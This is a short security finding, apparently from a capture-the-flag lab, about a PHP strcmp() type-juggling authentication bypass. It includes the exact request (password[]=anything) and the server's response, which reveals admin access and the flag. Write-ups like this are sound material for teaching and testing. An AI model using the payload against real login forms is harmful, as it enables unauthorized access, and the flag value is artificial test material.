findings.title: PHP strcmp() Type Juggling Authentication Bypass
findings.description: The login form at index.php uses PHP's strcmp() with loose comparison (==) to validate the password. By passing the password parameter as an array (password[]=anything), strcmp() receives an array instead of a string, causing it to return NULL. In PHP's loose comparison, NULL == 0 evaluates to true, completely bypassing authentication. The application then discloses the CTF flag.
findings.evidence:
Request: GET /index.php?username=admin&password[]=anything

Response body contains:
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71
Welcome Admin
Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}
